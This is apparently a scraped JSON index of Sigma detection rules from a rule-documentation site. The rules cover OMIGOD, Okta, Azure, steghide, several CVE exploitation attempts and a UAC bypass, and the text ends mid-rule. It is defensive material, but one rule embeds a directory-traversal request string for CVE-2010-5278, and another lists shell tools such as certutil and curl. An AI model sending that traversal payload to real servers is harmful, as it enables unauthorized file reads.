Legitimate use of SCX RunAsProvider ExecuteScript. References https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure https://github.com/Azure/Azure-Sentinel/pull/3059 https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_omigod_scx_runasprovider_executescript.yml Raw rule (edit) title: OMIGOD SCX RunAsProvider ExecuteScript id: 6eea1bf6-f8d2-488a-a742-e6ef6c1b67db status: experimental description: Rule to detect the use of the SCX RunAsProvider ExecuteScript to execute any UNIX/Linux script using the /bin/sh shell. Script being executed gets created as a temp file in /tmp folder with a scx* prefix. Then it is invoked from the following directory /etc/opt/microsoft/scx/conf/tmpdir/. The file in that directory has the same prefix scx*. SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including Microsoft Operations Manager. Microsoft Azure, and Microsoft Operations Management Suite. date: 2021/10/15 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC tags: - attack.privilege_escalation - attack.initial_access - attack.execution - attack.t1068 - attack.t1190 - attack.t1203 references: - https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure - https://github.com/Azure/Azure-Sentinel/pull/3059 - https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_omigod_scx_runasprovider_executescript.yml logsource: product: linux category: process_creation detection: selection: User: root LogonId: \u0026#39;0\u0026#39; CurrentDirectory: \u0026#39;/var/opt/microsoft/scx/tmp\u0026#39; CommandLine|contains: \u0026#39;/etc/opt/microsoft/scx/conf/tmpdir/scx\u0026#39; condition: selection falsepositives: - Legitimate use of SCX RunAsProvider ExecuteScript. level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/process_creation/proc_creation_lnx_omigod_scx_runasprovider_executescript.yml/","tags":["attack.privilege_escalation","attack.initial_access","attack.execution","attack.t1068","attack.t1190","attack.t1203"],"title":"OMIGOD SCX RunAsProvider ExecuteScript"},{"categories":null,"contents":"Rule to detect the use of the SCX RunAsProvider Invoke_ExecuteShellCommand to execute any UNIX/Linux command using the /bin/sh shell. SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including Microsoft Operations Manager. Microsoft Azure, and Microsoft Operations Management Suite.\nKnown false-positives Legitimate use of SCX RunAsProvider Invoke_ExecuteShellCommand. References https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure https://github.com/Azure/Azure-Sentinel/pull/3059 Raw rule (edit) title: OMIGOD SCX RunAsProvider ExecuteShellCommand id: 045b5f9c-49f7-4419-a236-9854fb3c827a description: Rule to detect the use of the SCX RunAsProvider Invoke_ExecuteShellCommand to execute any UNIX/Linux command using the /bin/sh shell. SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including Microsoft Operations Manager. Microsoft Azure, and Microsoft Operations Management Suite. status: experimental date: 2021/09/17 modified: 2021/11/11 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.privilege_escalation - attack.initial_access - attack.execution - attack.t1068 - attack.t1190 - attack.t1203 references: - https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure - https://github.com/Azure/Azure-Sentinel/pull/3059 logsource: product: linux service: auditd detection: selection: type: \u0026#39;SYSCALL\u0026#39; syscall: \u0026#39;execve\u0026#39; uid: \u0026#39;0\u0026#39; cwd: \u0026#39;/var/opt/microsoft/scx/tmp\u0026#39; comm: \u0026#39;sh\u0026#39; condition: selection falsepositives: - Legitimate use of SCX RunAsProvider Invoke_ExecuteShellCommand. level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_omigod_scx_runasprovider_executeshellcommand.yml/","tags":["attack.privilege_escalation","attack.initial_access","attack.execution","attack.t1068","attack.t1190","attack.t1203"],"title":"OMIGOD SCX RunAsProvider ExecuteShellCommand"},{"categories":null,"contents":"Rule to detect the use of the SCX RunAsProvider Invoke_ExecuteShellCommand to execute any UNIX/Linux command using the /bin/sh shell. SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including Microsoft Operations Manager. Microsoft Azure, and Microsoft Operations Management Suite.\nKnown false-positives Legitimate use of SCX RunAsProvider Invoke_ExecuteShellCommand. References https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure https://github.com/Azure/Azure-Sentinel/pull/3059 https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_omigod_scx_runasprovider_executeshellcommand.yml Raw rule (edit) title: OMIGOD SCX RunAsProvider ExecuteShellCommand id: 21541900-27a9-4454-9c4c-3f0a4240344a status: experimental description: Rule to detect the use of the SCX RunAsProvider Invoke_ExecuteShellCommand to execute any UNIX/Linux command using the /bin/sh shell. SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including Microsoft Operations Manager. Microsoft Azure, and Microsoft Operations Management Suite. date: 2021/10/15 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC tags: - attack.privilege_escalation - attack.initial_access - attack.execution - attack.t1068 - attack.t1190 - attack.t1203 references: - https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure - https://github.com/Azure/Azure-Sentinel/pull/3059 - https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_omigod_scx_runasprovider_executeshellcommand.yml logsource: product: linux category: process_creation detection: selection: User: root LogonId: \u0026#39;0\u0026#39; CurrentDirectory: \u0026#39;/var/opt/microsoft/scx/tmp\u0026#39; CommandLine|contains: \u0026#39;/bin/sh\u0026#39; condition: selection falsepositives: - Legitimate use of SCX RunAsProvider Invoke_ExecuteShellCommand. level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/process_creation/proc_creation_lnx_omigod_scx_runasprovider_executeshellcommand.yml/","tags":["attack.privilege_escalation","attack.initial_access","attack.execution","attack.t1068","attack.t1190","attack.t1203"],"title":"OMIGOD SCX RunAsProvider ExecuteShellCommand"},{"categories":null,"contents":"Detects adversary creating screen capture of a full with xwd. Highly recommended using rule on servers, due high usage of screenshot utilities on user workstations\nKnown false-positives Legitimate use of screenshot utility References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1113/T1113.md https://attack.mitre.org/techniques/T1113/ https://linux.die.net/man/1/xwd Raw rule (edit) title: Screen Capture with Xwd id: e2f17c5d-b02a-442b-9052-6eb89c9fec9c description: Detects adversary creating screen capture of a full with xwd. Highly recommended using rule on servers, due high usage of screenshot utilities on user workstations author: \u0026#39;Pawel Mazur\u0026#39; status: experimental date: 2021/09/13 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1113/T1113.md - https://attack.mitre.org/techniques/T1113/ - https://linux.die.net/man/1/xwd logsource: product: linux service: auditd detection: xwd: type: EXECVE a0: xwd xwd_root_window: a1: \u0026#39;-root\u0026#39; a2: \u0026#39;-out\u0026#39; a3|endswith: \u0026#39;.xwd\u0026#39; xwd_no_root_window: a1: \u0026#39;-out\u0026#39; a2|endswith: \u0026#39;.xwd\u0026#39; condition: xwd and (xwd_root_window or xwd_no_root_window) tags: - attack.collection - attack.t1113 falsepositives: - Legitimate use of screenshot utility level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_screencaputre_xwd.yml/","tags":["attack.collection","attack.t1113"],"title":"Screen Capture with Xwd"},{"categories":null,"contents":"Detects when an attempt at deactivating or resetting MFA.\nKnown false-positives If a MFA reset or deactivated was performed by a system administrator. References https://developer.okta.com/docs/reference/api/system-log/ https://developer.okta.com/docs/reference/api/event-types/ Raw rule (edit) title: Okta MFA Reset or Deactivated id: 50e068d7-1e6b-4054-87e5-0a592c40c7e0 description: Detects when an attempt at deactivating or resetting MFA. author: Austin Songer @austinsonger status: experimental date: 2021/09/21 modified: 2021/09/22 references: - https://developer.okta.com/docs/reference/api/system-log/ - https://developer.okta.com/docs/reference/api/event-types/ logsource: product: okta service: okta detection: selection: eventtype: - user.mfa.factor.deactivate - user.mfa.factor.reset_all condition: selection level: medium tags: - attack.persistence falsepositives: - If a MFA reset or deactivated was performed by a system administrator. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/okta/okta_mfa_reset_or_deactivated.yml/","tags":["attack.persistence"],"title":"Okta MFA Reset or Deactivated"},{"categories":null,"contents":"Detects when an security threat is detected in Okta.\nKnown false-positives None References https://okta.github.io/okta-help/en/prod/Content/Topics/Security/threat-insight/configure-threatinsight-system-log.htm https://developer.okta.com/docs/reference/api/system-log/ https://developer.okta.com/docs/reference/api/event-types/ Raw rule (edit) title: Okta Security Threat Detected id: 5c82f0b9-3c6d-477f-a318-0e14a1df73e0 description: Detects when an security threat is detected in Okta. author: Austin Songer @austinsonger status: experimental date: 2021/09/12 modified: 2021/09/22 references: - https://okta.github.io/okta-help/en/prod/Content/Topics/Security/threat-insight/configure-threatinsight-system-log.htm - https://developer.okta.com/docs/reference/api/system-log/ - https://developer.okta.com/docs/reference/api/event-types/ logsource: product: okta service: okta detection: selection: eventtype: security.threat.detected condition: selection level: medium falsepositives: - None ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/okta/okta_security_threat_detected.yml/","tags":null,"title":"Okta Security Threat Detected"},{"categories":null,"contents":"Identifies when a new cloudshell is created inside of Azure portal.\nKnown false-positives A new cloudshell may be created by a system administrator. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations Raw rule (edit) title: Azure New CloudShell Created id: 72af37e2-ec32-47dc-992b-bc288a2708cb description: Identifies when a new cloudshell is created inside of Azure portal. author: Austin Songer status: experimental date: 2021/09/21 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations logsource: product: azure service: azure.activitylogs detection: selection: properties.message: MICROSOFT.PORTAL/CONSOLES/WRITE condition: selection level: medium tags: - attack.execution - attack.t1059 falsepositives: - A new cloudshell may be created by a system administrator. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_new_cloudshell_created.yml/","tags":["attack.execution","attack.t1059"],"title":"Azure New CloudShell Created"},{"categories":null,"contents":"Detects when an the Administrator role is assigned to an user or group.\nKnown false-positives Administrator roles could be assigned to users or group by other admin users. References https://developer.okta.com/docs/reference/api/system-log/ https://developer.okta.com/docs/reference/api/event-types/ Raw rule (edit) title: Okta Admin Role Assigned to an User or Group id: 413d4a81-6c98-4479-9863-014785fd579c description: Detects when an the Administrator role is assigned to an user or group. author: Austin Songer @austinsonger status: experimental date: 2021/09/12 modified: 2021/09/22 references: - https://developer.okta.com/docs/reference/api/system-log/ - https://developer.okta.com/docs/reference/api/event-types/ logsource: product: okta service: okta detection: selection: eventtype: - group.privilege.grant - user.account.privilege.grant condition: selection level: medium tags: - attack.impact falsepositives: - Administrator roles could be assigned to users or group by other admin users. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/okta/okta_admin_role_assigned_to_user_or_group.yml/","tags":["attack.impact"],"title":"Okta Admin Role Assigned to an User or Group"},{"categories":null,"contents":"Detects when unauthorized access to app occurs.\nKnown false-positives User might of believe that they had access. References https://developer.okta.com/docs/reference/api/system-log/ https://developer.okta.com/docs/reference/api/event-types/ Raw rule (edit) title: Okta Unauthorized Access to App id: 6cc2b61b-d97e-42ef-a9dd-8aa8dc951657 description: Detects when unauthorized access to app occurs. author: Austin Songer @austinsonger status: experimental date: 2021/09/12 modified: 2021/09/22 references: - https://developer.okta.com/docs/reference/api/system-log/ - https://developer.okta.com/docs/reference/api/event-types/ logsource: product: okta service: okta detection: selection: displaymessage: - User attempted unauthorized access to app condition: selection level: medium tags: - attack.impact falsepositives: - User might of believe that they had access. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/okta/okta_unauthorized_access_to_app.yml/","tags":["attack.impact"],"title":"Okta Unauthorized Access to App"},{"categories":null,"contents":"Detects when an user account is locked out.\nKnown false-positives Unknown References https://developer.okta.com/docs/reference/api/system-log/ https://developer.okta.com/docs/reference/api/event-types/ Raw rule (edit) title: Okta User Account Locked Out id: 14701da0-4b0f-4ee6-9c95-2ffb4e73bb9a description: Detects when an user account is locked out. author: Austin Songer @austinsonger status: experimental date: 2021/09/12 modified: 2021/09/22 references: - https://developer.okta.com/docs/reference/api/system-log/ - https://developer.okta.com/docs/reference/api/event-types/ logsource: product: okta service: okta detection: selection: displaymessage: Max sign in attempts exceeded condition: selection level: medium tags: - attack.impact falsepositives: - Unknown ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/okta/okta_user_account_locked_out.yml/","tags":["attack.impact"],"title":"Okta User Account Locked Out"},{"categories":null,"contents":"Detects when an Network Zone is Deactivated or Deleted.\nKnown false-positives Unknown References https://developer.okta.com/docs/reference/api/system-log/ https://developer.okta.com/docs/reference/api/event-types/ Raw rule (edit) title: Okta Network Zone Deactivated or Deleted id: 9f308120-69ed-4506-abde-ac6da81f4310 description: Detects when an Network Zone is Deactivated or Deleted. author: Austin Songer @austinsonger status: experimental date: 2021/09/12 modified: 2021/09/22 references: - https://developer.okta.com/docs/reference/api/system-log/ - https://developer.okta.com/docs/reference/api/event-types/ logsource: product: okta service: okta detection: selection: eventtype: - zone.deactivate - zone.delete condition: selection level: medium tags: - attack.impact falsepositives: - Unknown ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/okta/okta_network_zone_deactivated_or_deleted.yml/","tags":["attack.impact"],"title":"Okta Network Zone Deactivated or Deleted"},{"categories":null,"contents":"Detects when a API token is created\nKnown false-positives Unknown References https://developer.okta.com/docs/reference/api/system-log/ https://developer.okta.com/docs/reference/api/event-types/ Raw rule (edit) title: Okta API Token Created id: 19951c21-229d-4ccb-8774-b993c3ff3c5c description: Detects when a API token is created author: Austin Songer @austinsonger status: experimental date: 2021/09/12 modified: 2021/09/22 references: - https://developer.okta.com/docs/reference/api/system-log/ - https://developer.okta.com/docs/reference/api/event-types/ logsource: product: okta service: okta detection: selection: eventtype: system.api_token.create condition: selection level: medium tags: - attack.persistence falsepositives: - Unknown ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/okta/okta_api_token_created.yml/","tags":["attack.persistence"],"title":"Okta API Token Created"},{"categories":null,"contents":"Detects when a API Token is revoked.\nKnown false-positives Unknown References https://developer.okta.com/docs/reference/api/system-log/ https://developer.okta.com/docs/reference/api/event-types/ Raw rule (edit) title: Okta API Token Revoked id: cf1dbc6b-6205-41b4-9b88-a83980d2255b description: Detects when a API Token is revoked. author: Austin Songer @austinsonger status: experimental date: 2021/09/12 modified: 2021/09/22 references: - https://developer.okta.com/docs/reference/api/system-log/ - https://developer.okta.com/docs/reference/api/event-types/ logsource: product: okta service: okta detection: selection: eventtype: system.api_token.revoke condition: selection level: medium tags: - attack.impact falsepositives: - Unknown ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/okta/okta_api_token_revoked.yml/","tags":["attack.impact"],"title":"Okta API Token Revoked"},{"categories":null,"contents":"Detects when an application is modified or deleted.\nKnown false-positives Unknown References https://developer.okta.com/docs/reference/api/system-log/ https://developer.okta.com/docs/reference/api/event-types/ Raw rule (edit) title: Okta Application Modified or Deleted id: 7899144b-e416-4c28-b0b5-ab8f9e0a541d description: Detects when an application is modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/09/12 modified: 2021/09/22 references: - https://developer.okta.com/docs/reference/api/system-log/ - https://developer.okta.com/docs/reference/api/event-types/ logsource: product: okta service: okta detection: selection: eventtype: - application.lifecycle.update - application.lifecycle.delete condition: selection level: medium tags: - attack.impact falsepositives: - Unknown ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/okta/okta_application_modified_or_deleted.yml/","tags":["attack.impact"],"title":"Okta Application Modified or Deleted"},{"categories":null,"contents":"Detects when an application Sign-on Policy is modified or deleted.\nKnown false-positives Unknown References https://developer.okta.com/docs/reference/api/system-log/ https://developer.okta.com/docs/reference/api/event-types/ Raw rule (edit) title: Okta Application Sign-On Policy Modified or Deleted id: 8f668cc4-c18e-45fe-ad00-624a981cf88a description: Detects when an application Sign-on Policy is modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/09/12 modified: 2021/09/22 references: - https://developer.okta.com/docs/reference/api/system-log/ - https://developer.okta.com/docs/reference/api/event-types/ logsource: product: okta service: okta detection: selection: eventtype: - application.policy.sign_on.update - application.policy.sign_on.rule.delete condition: selection level: medium tags: - attack.impact falsepositives: - Unknown ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/okta/okta_application_sign_on_policy_modified_or_deleted.yml/","tags":["attack.impact"],"title":"Okta Application Sign-On Policy Modified or Deleted"},{"categories":null,"contents":"Detects when an Policy Rule is Modified or Deleted.\nKnown false-positives Unknown References https://developer.okta.com/docs/reference/api/system-log/ https://developer.okta.com/docs/reference/api/event-types/ Raw rule (edit) title: Okta Policy Rule Modified or Deleted id: 0c97c1d3-4057-45c9-b148-1de94b631931 description: Detects when an Policy Rule is Modified or Deleted. author: Austin Songer @austinsonger status: experimental date: 2021/09/12 modified: 2021/09/22 references: - https://developer.okta.com/docs/reference/api/system-log/ - https://developer.okta.com/docs/reference/api/event-types/ logsource: product: okta service: okta detection: selection: eventtype: - policy.rule.update - policy.rule.delete condition: selection level: medium tags: - attack.impact falsepositives: - Unknown ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/okta/okta_policy_rule_modified_or_deleted.yml/","tags":["attack.impact"],"title":"Okta Policy Rule Modified or Deleted"},{"categories":null,"contents":"Detects when an Okta policy is modified or deleted.\nKnown false-positives Okta Policies being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Okta Policies modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://developer.okta.com/docs/reference/api/system-log/ https://developer.okta.com/docs/reference/api/event-types/ Raw rule (edit) title: Okta Policy Modified or Deleted id: 1667a172-ed4c-463c-9969-efd92195319a description: Detects when an Okta policy is modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/09/12 modified: 2021/09/22 references: - https://developer.okta.com/docs/reference/api/system-log/ - https://developer.okta.com/docs/reference/api/event-types/ logsource: product: okta service: okta detection: selection: eventtype: - policy.lifecycle.update - policy.lifecycle.delete condition: selection level: low tags: - attack.impact falsepositives: - Okta Policies being modified or deleted may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Okta Policies modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/okta/okta_policy_modified_or_deleted.yml/","tags":["attack.impact"],"title":"Okta Policy Modified or Deleted"},{"categories":null,"contents":"MODx manager - Local File Inclusion:Directory traversal vulnerability in manager/controllers/default/resource/tvs.php in MODx Revolution 2.0.2-pl, and possibly earlier, when magic_quotes_gpc is disabled, allows remote attackers to read arbitrary files via a .. (dot dot) in the class_key parameter.\nKnown false-positives Scanning from Nuclei Penetration Testing Activity Unknown References https://github.com/projectdiscovery/nuclei-templates Raw rule (edit) title: CVE-2010-5278 Exploitation Attempt id: a4a899e8-fd7a-49dd-b5a8-7044def72d61 author: Subhash Popuri (@pbssubhash) date: 2021/08/25 status: experimental description: MODx manager - Local File Inclusion:Directory traversal vulnerability in manager/controllers/default/resource/tvs.php in MODx Revolution 2.0.2-pl, and possibly earlier, when magic_quotes_gpc is disabled, allows remote attackers to read arbitrary files via a .. (dot dot) in the class_key parameter. references: - https://github.com/projectdiscovery/nuclei-templates logsource: category: webserver detection: selection: c-uri|contains: - /manager/controllers/default/resource/tvs.php?class_key=../../../../../../../../../../windows/win.ini%00 condition: selection falsepositives: - Scanning from Nuclei - Penetration Testing Activity - Unknown tags: - attack.initial_access - attack.t1190 level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_cve_2010_5278_exploitation_attempt.yml/","tags":["attack.initial_access","attack.t1190"],"title":"CVE-2010-5278 Exploitation Attempt"},{"categories":null,"contents":"Detects extraction of files with usage of steghide binary, the adversaries may use this technique to prevent the detection of hidden information.\nKnown false-positives None References https://attack.mitre.org/techniques/T1027/003/ https://vitux.com/how-to-hide-confidential-files-in-images-on-debian-using-steganography/ Raw rule (edit) title: Steganography Extract Files with Steghide id: a5a827d9-1bbe-4952-9293-c59d897eb41b description: Detects extraction of files with usage of steghide binary, the adversaries may use this technique to prevent the detection of hidden information. author: \u0026#39;Pawel Mazur\u0026#39; status: experimental date: 2021/09/11 references: - https://attack.mitre.org/techniques/T1027/003/ - https://vitux.com/how-to-hide-confidential-files-in-images-on-debian-using-steganography/ tags: - attack.defense_evasion - attack.t1027.003 falsepositives: - None level: low logsource: product: linux service: auditd detection: Steghide: type: EXECVE a0: steghide a1: extract a2: \u0026#39;-sf\u0026#39; a3|endswith: - \u0026#39;.jpg\u0026#39; - \u0026#39;.png\u0026#39; condition: Steghide ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_steghide_extract_steganography.yml/","tags":["attack.defense_evasion","attack.t1027.003"],"title":"Steganography Extract Files with Steghide"},{"categories":null,"contents":"Detects embeding of files with usage of steghide binary, the adversaries may use this technique to prevent the detection of hidden information.\nKnown false-positives None References https://attack.mitre.org/techniques/T1027/003/ https://vitux.com/how-to-hide-confidential-files-in-images-on-debian-using-steganography/ Raw rule (edit) title: Steganography Hide Files with Steghide id: ce446a9e-30b9-4483-8e38-d2c9ad0a2280 description: Detects embeding of files with usage of steghide binary, the adversaries may use this technique to prevent the detection of hidden information. author: \u0026#39;Pawel Mazur\u0026#39; status: experimental date: 2021/09/11 references: - https://attack.mitre.org/techniques/T1027/003/ - https://vitux.com/how-to-hide-confidential-files-in-images-on-debian-using-steganography/ tags: - attack.defense_evasion - attack.t1027.003 falsepositives: - None level: low logsource: product: linux service: auditd detection: Steghide: type: EXECVE a0: steghide a1: embed a2: - \u0026#39;-cf\u0026#39; - \u0026#39;-ef\u0026#39; a4: - \u0026#39;-cf\u0026#39; - \u0026#39;-ef\u0026#39; condition: Steghide ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_steghide_embed_steganography.yml/","tags":["attack.defense_evasion","attack.t1027.003"],"title":"Steganography Hide Files with Steghide"},{"categories":null,"contents":"Detects file creation patterns noticeable during the exploitation of CVE-2021-40444\nKnown false-positives unknown References https://twitter.com/RonnyTNL/status/1436334640617373699?s=20 https://twitter.com/vanitasnk/status/1437329511142420483?s=21 Raw rule (edit) title: Suspicious Word Cab File Write CVE-2021-40444 id: 60c0a111-787a-4e8a-9262-ee485f3ef9d5 description: Detects file creation patterns noticeable during the exploitation of CVE-2021-40444 status: experimental references: - https://twitter.com/RonnyTNL/status/1436334640617373699?s=20 - https://twitter.com/vanitasnk/status/1437329511142420483?s=21 author: Florian Roth, Sittikorn S date: 2021/09/10 modified: 2021/09/13 logsource: product: windows category: file_event detection: selection: Image: \u0026#39;\\winword.exe\u0026#39; TargetFilename|endswith: \u0026#39;.cab\u0026#39; TargetFilename|contains: \u0026#39;\\Windows\\INetCache\u0026#39; selection_inf: Image: \u0026#39;\\winword.exe\u0026#39; TargetFilename|contains|all: - \u0026#39;\\AppData\\Local\\Temp\\\u0026#39; - \u0026#39;.inf\u0026#39; condition: selection or selection_inf fields: - TargetFilename falsepositives: - unknown level: critical tags: - attack.resource_development - attack.t1587 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_winword_cve_2021_40444.yml/","tags":["attack.resource_development","attack.t1587"],"title":"Suspicious Word Cab File Write CVE-2021-40444"},{"categories":null,"contents":"Detects spawning of suspicious child processes by Atlassian Confluence server which may indicate successful exploitation of CVE-2021-26084\nKnown false-positives Unknown References https://nvd.nist.gov/vuln/detail/CVE-2021-26084 https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html https://github.com/h3v0x/CVE-2021-26084_Confluence Raw rule (edit) title: Atlassian Confluence CVE-2021-26084 id: 245f92e3-c4da-45f1-9070-bc552e06db11 status: experimental description: Detects spawning of suspicious child processes by Atlassian Confluence server which may indicate successful exploitation of CVE-2021-26084 author: Bhabesh Raj date: 2021/09/08 references: - https://nvd.nist.gov/vuln/detail/CVE-2021-26084 - https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html - https://github.com/h3v0x/CVE-2021-26084_Confluence tags: - attack.initial_access - attack.execution - attack.t1190 - attack.t1059 logsource: category: process_creation product: windows detection: selection: # Monitor suspicious child processes spawned by Confluence ParentImage|endswith: \u0026#39;\\Atlassian\\Confluence\\jre\\bin\\java.exe\u0026#39; CommandLine|contains: - \u0026#39;cmd /c\u0026#39; - \u0026#39;cmd /k\u0026#39; - \u0026#39;powershell\u0026#39; - \u0026#39;certutil\u0026#39; - \u0026#39;curl\u0026#39; - \u0026#39;whoami\u0026#39; - \u0026#39;ipconfig\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_atlassian_confluence_cve_2021_26084_exploit.yml/","tags":["attack.initial_access","attack.execution","attack.t1190","attack.t1059"],"title":"Atlassian Confluence CVE-2021-26084"},{"categories":null,"contents":"Detects an authentication bypass vulnerability affecting the REST API URLs in ADSelfService Plus (CVE-2021-40539).\nKnown false-positives External Pentesting References https://therecord.media/cisa-warns-of-zoho-server-zero-day-exploited-in-the-wild/ https://www.manageengine.com/products/self-service-password/kb/how-to-fix-authentication-bypass-vulnerability-in-REST-API.html https://us-cert.cisa.gov/ncas/alerts/aa21-259a Raw rule (edit) title: CVE-2021-40539 Zoho ManageEngine ADSelfService Plus Exploit id: fcbb4a77-f368-4945-b046-4499a1da69d1 status: experimental description: Detects an authentication bypass vulnerability affecting the REST API URLs in ADSelfService Plus (CVE-2021-40539). references: - https://therecord.media/cisa-warns-of-zoho-server-zero-day-exploited-in-the-wild/ - https://www.manageengine.com/products/self-service-password/kb/how-to-fix-authentication-bypass-vulnerability-in-REST-API.html - https://us-cert.cisa.gov/ncas/alerts/aa21-259a author: Sittikorn S, Nuttakorn Tungpoonsup date: 2021/09/10 modified: 2021/09/17 tags: - attack.initial_access - attack.t1190 - attack.persistence - attack.t1505.003 logsource: product: zoho_manageengine category: webserver definition: \u0026#39;Must be collect log from \\ManageEngine\\ADSelfService Plus\\logs\u0026#39; detection: selection: c-uri|contains: - \u0026#39;/help/admin-guide/Reports/ReportGenerate.jsp\u0026#39; - \u0026#39;/RestAPI/LogonCustomization\u0026#39; - \u0026#39;/RestAPI/Connection\u0026#39; condition: selection fields: - c-ip - c-uri falsepositives: - External Pentesting level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_cve_2021_40539_manageengine_adselfservice_exploit.yml/","tags":["attack.initial_access","attack.t1190","attack.persistence","attack.t1505.003"],"title":"CVE-2021-40539 Zoho ManageEngine ADSelfService Plus Exploit"},{"categories":null,"contents":"Detects the pattern of UAC Bypass using computerdefaults.exe (UACMe 59)\nKnown false-positives Unknown References https://github.com/hfiref0x/UACME Raw rule (edit) title: UAC Bypass Using ComputerDefaults id: 3c05e90d-7eba-4324-9972-5d7f711a60a8 description: Detects the pattern of UAC Bypass using computerdefaults.exe (UACMe 59) author: Christian Burkard date: 2021/08/31 status: experimental references: - https://github.com/hfiref0x/UACME tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_creation product: windows detection: selection: IntegrityLevel: - \u0026#39;High\u0026#39; - \u0026#39;System\u0026#39; Image: \u0026#39;C:\\Windows\\System32\\ComputerDefaults.exe\u0026#39; filter: ParentImage|contains: - \u0026#39;:\\Windows\\System32\u0026#39; - \u0026#39;:\\Program Files\u0026#39; condition: selection and not filter falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_uac_bypass_computerdefaults.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002"],"title":"UAC Bypass Using ComputerDefaults"},{"categories":null,"contents":"Detects when a user enables DNS-over-HTTPS. This can be used to hide internet activity or be used to hide the process of exfiltrating data. With this enabled organization will lose visibility into data such as query type, response and originating IP that are used to determine bad actors.\nKnown false-positives Unlikely References https://www.tenforums.com/tutorials/151318-how-enable-disable-dns-over-https-doh-microsoft-edge.html https://github.com/elastic/detection-rules/issues/1371 https://chromeenterprise.google/policies/?policy=DnsOverHttpsMode https://admx.help/HKLM/Software/Policies/Mozilla/Firefox/DNSOverHTTPS Raw rule (edit) title: DNS-over-HTTPS Enabled by Registry id: 04b45a8a-d11d-49e4-9acc-4a1b524407a5 status: experimental description: Detects when a user enables DNS-over-HTTPS. This can be used to hide internet activity or be used to hide the process of exfiltrating data. With this enabled organization will lose visibility into data such as query type, response and originating IP that are used to determine bad actors. author: Austin Songer references: - https://www.tenforums.com/tutorials/151318-how-enable-disable-dns-over-https-doh-microsoft-edge.html - https://github.com/elastic/detection-rules/issues/1371 - https://chromeenterprise.google/policies/?policy=DnsOverHttpsMode - https://admx.help/HKLM/Software/Policies/Mozilla/Firefox/DNSOverHTTPS date: 2021/07/22 modified: 2022/01/13 logsource: product: windows category: registry_event detection: selection_edge: EventType: SetValue TargetObject|endswith: \u0026#39;\\SOFTWARE\\Policies\\Microsoft\\Edge\\BuiltInDnsClientEnabled\u0026#39; Details: \u0026#39;DWORD (1)\u0026#39; selection_chrome: EventType: SetValue TargetObject|endswith: \u0026#39;\\SOFTWARE\\Google\\Chrome\\DnsOverHttpsMode\u0026#39; Details: \u0026#39;DWORD (secure)\u0026#39; selection_firefox: EventType: SetValue TargetObject|endswith: 